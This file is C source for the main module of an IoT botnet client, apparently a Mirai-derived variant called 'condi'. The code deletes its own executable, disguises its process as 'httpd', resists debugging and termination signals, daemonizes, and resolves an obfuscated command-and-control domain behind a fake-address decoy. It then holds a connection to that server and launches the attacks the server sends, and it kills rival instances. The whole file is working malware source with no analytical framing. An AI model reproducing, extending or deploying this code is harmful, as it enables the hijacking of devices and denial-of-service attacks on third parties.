#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <sys/wait.h>
#include <linux/limits.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <dirent.h>
#include <libgen.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "util.h"
#include "resolv.h"
#include "killer.h"
#include "antidebug.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, ioctl_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

ipv4_t LOCAL_ADDR;
uint32_t LOCAL_ADDR2;
volatile sig_atomic_t is_defending = 0;

void handle_signal(int signum) {
    is_defending = 1;
}

void defend_binary() {
    signal(SIGTERM, handle_signal);
    signal(SIGINT, handle_signal);
    signal(SIGQUIT, handle_signal);
    signal(SIGTSTP, SIG_IGN);  // Ignore Ctrl+Z
    signal(SIGTTIN, SIG_IGN);  // Ignore background read attempts
    signal(SIGTTOU, SIG_IGN);  // Ignore background write attempts
}

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

void flush(void)
{
  char buf[4096];
  int len = 0;
  int fd = -1;

  if((len = readlink("/proc/self/exe", buf, sizeof(buf) - 1)) == -1)
    return;

  // Delete our original executable
  remove(buf);

  // Recreate it
  if((fd = open(buf, O_CREAT|O_WRONLY|O_TRUNC, 0777)) == -1)
    return;

  close(fd);
  return;
}

int main(int argc, char **args)
{
    char name_buf[32];
    char id_buf[32];
    int pgid, pings = 0; 
    defend_binary();
    antidebug();
    unlink(args[0]);

    #ifndef DEBUG
        sigset_t sigs;
        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);
    #endif

    #ifdef DEBUG
        printf("(condi/main) debug started in pid: %d\n", getpid());

        struct sigaction sa;

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if (sigaction(SIGSEGV, &sa, NULL) == -1)
            perror("sigaction");

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if (sigaction(SIGBUS, &sa, NULL) == -1)
            perror("sigaction");
    #endif
    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();
    anti_gdb_entry(0);

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    util_strcpy(args[0], "httpd");
    prctl(PR_SET_NAME, "httpd");

    signal(SIGCHLD, SIG_IGN);

    #ifndef DEBUG
        if (fork() > 0)
            return 0;
        pgid = setsid();
        close(STDIN);
        close(STDOUT);
        close(STDERR);
    #endif
    flush();
    attack_init();
    killer_init();
    antidebug();

    chdir("/");

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        if (fd_serv == -1)
            establish_connection();


        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf("(condi/main): detected newer instance running! killing process\n");
#endif
            killer_kill();
            attack_kill_all();
            kill(pgid * -1, 9);
            exit(0);
        }
        if(pending_connection)
        {
            pending_connection = FALSE;

            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                #ifdef DEBUG
                    printf("(condi/main): timed out while connecting to cnc\n");
                #endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    #ifdef DEBUG
                        printf("(condi/main): error while connecting to cnc, code=%d\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if(id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }

                    #ifdef DEBUG
                        printf("(condi/main): connected to cnc successfully\n");
                    #endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n;
            uint16_t len;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if (n == 0)
            {
#ifdef DEBUG
                printf("(condi/main): Lost connection with CNC (errno = %d) 1\n", errno);
#endif
                teardown_connection();
                continue;
            }

            if (len == 0)
            {
                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if (len > sizeof (rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if (n == 0)
            {
#ifdef DEBUG
                printf("(condi/main): Lost connection with CNC (errno = %d) 2\n", errno);
#endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
            printf("(condi/main): Received %d bytes from CNC\n", len);
#endif

            struct Attack attack;
            if (attack_parse((const char*)rdbuf, len, &attack) == 0) {
                attack_start(attack.duration, attack.vector, attack.targs_len, attack.targs, attack.opts_len, attack.opts);
                free(attack.targs);
            } else {
                {
                    #ifdef DEBUG
                    printf("(condi/main): unable to parse attack information\n");
                    #endif
                }
            }
        }
    }
    antidebug();
    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    struct resolv_entries * entries;
    
    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL)
    {
    #ifdef DEBUG
        printf("(condi/main): failed to resolve cnc address from domain\n");
    #endif
        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);
    srv_addr.sin_port = htons(CNC_PORT);
    #ifdef DEBUG
    printf("(condi/main): Resolved domain\n");
    #endif

}

static void establish_connection(void)
{
#ifdef DEBUG
    printf("(condi/main): Attempting to connect to CNC\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("(condi/main): Failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}

static void teardown_connection(void)
{
#ifdef DEBUG
    printf("(condi/main): Tearing down connection to CNC!\n");
#endif

    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep(1);
}
